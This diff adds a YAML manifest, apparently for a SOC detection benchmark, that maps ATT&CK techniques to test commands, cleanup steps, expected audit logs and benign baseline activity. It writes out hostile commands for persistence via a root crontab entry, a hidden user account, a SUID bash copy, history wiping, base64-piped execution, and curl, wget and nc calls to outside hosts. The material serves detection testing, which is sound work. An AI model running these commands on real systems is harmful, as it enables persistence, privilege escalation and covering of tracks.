@@ -1,0 +1,216 @@
+# SOC Detection Benchmark - Attack Manifest
+# Maps ATT&CK techniques to Atomic Red Team tests
+
+metadata:
+  version: "1.0.0"
+  description: "Attack test plan for detection rule evaluation"
+  author: "SOC Detection Benchmark"
+
+techniques:
+  # ============================================
+  # Execution
+  # ============================================
+  - id: T1059.004
+    name: "Unix Shell"
+    tactic: execution
+    description: "Command execution via bash/sh"
+    atomic_tests:
+      - name: "Execute shell commands"
+        command: |
+          /bin/bash -c 'whoami && id && hostname'
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: exec
+
+  # ============================================
+  # Persistence
+  # ============================================
+  - id: T1053.003
+    name: "Cron"
+    tactic: persistence
+    description: "Scheduled task via cron"
+    atomic_tests:
+      - name: "Create cron job"
+        command: |
+          echo "* * * * * root /tmp/malicious.sh" >> /etc/crontab
+        cleanup: |
+          sed -i '/malicious.sh/d' /etc/crontab
+        expected_logs:
+          - type: auditd
+            key: cron_mod
+
+  - id: T1136.001
+    name: "Local Account"
+    tactic: persistence
+    description: "Create local user account"
+    atomic_tests:
+      - name: "Create user with useradd"
+        command: |
+          useradd -M -N -r -s /bin/bash evil_user
+        cleanup: |
+          userdel evil_user 2>/dev/null || true
+        expected_logs:
+          - type: auditd
+            key: user_add
+          - type: auditd
+            key: user_mod
+
+  # ============================================
+  # Privilege Escalation
+  # ============================================
+  - id: T1548.001
+    name: "Setuid and Setgid"
+    tactic: privilege-escalation
+    description: "Set SUID bit on file"
+    atomic_tests:
+      - name: "Set SUID bit"
+        command: |
+          cp /bin/bash /tmp/suid_bash
+          chmod u+s /tmp/suid_bash
+        cleanup: |
+          rm -f /tmp/suid_bash
+        expected_logs:
+          - type: auditd
+            key: priv_esc
+
+  # ============================================
+  # Defense Evasion
+  # ============================================
+  - id: T1070.004
+    name: "File Deletion"
+    tactic: defense-evasion
+    description: "Delete files to remove indicators"
+    atomic_tests:
+      - name: "Delete file using rm"
+        command: |
+          touch /tmp/evidence.txt
+          rm -f /tmp/evidence.txt
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: file_delete
+
+  - id: T1070.003
+    name: "Clear Command History"
+    tactic: defense-evasion
+    description: "Clear shell history"
+    atomic_tests:
+      - name: "Clear bash history"
+        command: |
+          history -c
+          echo "" > ~/.bash_history
+          unset HISTFILE
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: shell_history
+
+  - id: T1027
+    name: "Obfuscated Files or Information"
+    tactic: defense-evasion
+    description: "Encode/decode data to evade detection"
+    atomic_tests:
+      - name: "Base64 encode command"
+        command: |
+          echo "whoami" | base64 | base64 -d | /bin/bash
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: exec
+
+  # ============================================
+  # Discovery
+  # ============================================
+  - id: T1018
+    name: "Remote System Discovery"
+    tactic: discovery
+    description: "Discover remote systems"
+    atomic_tests:
+      - name: "Network scan with nmap"
+        command: |
+          nmap -sn 192.168.1.0/24 2>/dev/null || true
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: network_socket
+
+  - id: T1082
+    name: "System Information Discovery"
+    tactic: discovery
+    description: "Gather system information"
+    atomic_tests:
+      - name: "Gather system info"
+        command: |
+          cat /etc/os-release
+          uname -a
+          hostname
+          cat /proc/version
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: sys_info
+
+  # ============================================
+  # Command and Control
+  # ============================================
+  - id: T1105
+    name: "Ingress Tool Transfer"
+    tactic: command-and-control
+    description: "Download tools from remote server"
+    atomic_tests:
+      - name: "Download with curl"
+        command: |
+          curl -s -o /tmp/downloaded_tool http://example.com/tool.txt || true
+        cleanup: |
+          rm -f /tmp/downloaded_tool
+        expected_logs:
+          - type: auditd
+            key: network_connect
+
+      - name: "Download with wget"
+        command: |
+          wget -q -O /tmp/downloaded_tool http://example.com/tool.txt || true
+        cleanup: |
+          rm -f /tmp/downloaded_tool
+        expected_logs:
+          - type: auditd
+            key: network_connect
+
+  - id: T1571
+    name: "Non-Standard Port"
+    tactic: command-and-control
+    description: "Communication over non-standard ports"
+    atomic_tests:
+      - name: "Connect to high port"
+        command: |
+          nc -zv 8.8.8.8 4444 2>/dev/null || true
+          nc -zv 8.8.8.8 8080 2>/dev/null || true
+        cleanup: null
+        expected_logs:
+          - type: auditd
+            key: network_connect
+
+# Benign baseline activities (for FP measurement)
+baseline:
+  - name: "Normal file operations"
+    command: |
+      ls -la /tmp
+      cat /etc/hosts
+      touch /tmp/normal_file.txt
+      rm /tmp/normal_file.txt
+    duration_seconds: 5
+
+  - name: "Normal network activity"
+    command: |
+      curl -s http://example.com > /dev/null || true
+      ping -c 1 8.8.8.8 > /dev/null || true
+    duration_seconds: 5
+
+  - name: "Normal system queries"
+    command: |
+      ps aux
+      df -h
+      free -m
+      top -bn1 | head -20
+    duration_seconds: 5
